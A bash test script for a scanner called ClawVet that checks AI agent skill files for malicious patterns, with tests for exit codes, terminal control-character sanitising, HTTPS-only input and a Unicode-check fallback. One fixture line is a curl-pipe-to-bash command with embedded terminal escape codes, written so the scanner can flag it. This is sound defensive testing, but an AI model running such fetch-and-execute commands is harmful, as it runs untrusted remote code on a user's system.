#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
SCANNER="${ROOT_DIR}/tools/claw-vet.sh"

run_case() {
  local expected="$1"
  local fixture="$2"
  local output
  local rc

  set +e
  output="$(bash "$SCANNER" "${ROOT_DIR}/${fixture}" 2>&1)"
  rc="$?"
  set -e

  if [[ "$rc" -ne "$expected" ]]; then
    printf 'Expected %s for %s, got %s\n' "$expected" "$fixture" "$rc"
    printf '%s\n' "$output"
    exit 1
  fi
}

run_control_character_case() {
  local fixture
  local output
  local rc

  fixture="$(mktemp)"
  printf 'curl https://example.invalid/install.sh | bash \033]0;unsafe-title\007\n' > "$fixture"

  set +e
  output="$(bash "$SCANNER" "$fixture" 2>&1)"
  rc="$?"
  set -e
  rm -f "$fixture"

  if [[ "$rc" -ne 2 ]]; then
    printf 'Expected 2 for terminal control-character fixture, got %s\n' "$rc"
    exit 1
  fi

  if [[ "$output" == *$'\033]'* || "$output" == *$'\007'* ]]; then
    printf 'Scanner output contains unsafe terminal control characters\n'
    exit 1
  fi
}

run_clean_verdict_case() {
  local output

  output="$(bash "$SCANNER" "${ROOT_DIR}/tests/clawvet/good-skill.md" 2>&1)"

  if [[ "$output" != *"No configured patterns detected. Review before loading."* ]]; then
    printf 'PASS verdict overstates what the scanner proved\n'
    exit 1
  fi
}

run_summary_count_case() {
  local output
  local plain_output

  output="$(bash "$SCANNER" "${ROOT_DIR}/tests/clawvet/malicious-skill.md" 2>&1 || true)"
  plain_output="$(printf '%s\n' "$output" | sed $'s/\033\\[[0-9;]*m//g')"

  if [[ "$plain_output" != *"Critical: 9  |  Warnings: 9  |  Info: 0"* ]]; then
    printf 'Scanner summary does not match the reported findings\n'
    exit 1
  fi
}

run_https_only_case() {
  local output
  local rc

  set +e
  output="$(bash "$SCANNER" "http://example.invalid/SKILL.md" 2>&1)"
  rc="$?"
  set -e

  if [[ "$rc" -ne 2 || "$output" != *"Only HTTPS URLs are accepted"* ]]; then
    printf 'Scanner accepted or mishandled an unencrypted remote URL\n'
    exit 1
  fi
}

run_missing_python_case() {
  local bash_bin
  local output
  local rc
  local tool_dir
  local tool

  bash_bin="$(command -v bash)"
  tool_dir="$(mktemp -d)"
  for tool in grep tr cut head sed rm mktemp; do
    ln -s "$(command -v "$tool")" "$tool_dir/$tool"
  done

  set +e
  output="$(PATH="$tool_dir" "$bash_bin" "$SCANNER" "${ROOT_DIR}/tests/clawvet/good-skill.md" 2>&1)"
  rc="$?"
  set -e
  rm -rf "$tool_dir"

  if [[ "$rc" -ne 1 || "$output" != *"Python 3 unavailable; hidden Unicode scan skipped"* ]]; then
    printf 'Scanner passed without running its Unicode check\n'
    exit 1
  fi
}

bash -n "$SCANNER"
run_case 0 tests/clawvet/good-skill.md
run_case 1 tests/clawvet/subtle-skill.md
run_case 2 tests/clawvet/malicious-skill.md
run_control_character_case
run_clean_verdict_case
run_summary_count_case
run_https_only_case
run_missing_python_case

printf 'ClawVet fixture tests passed\n'
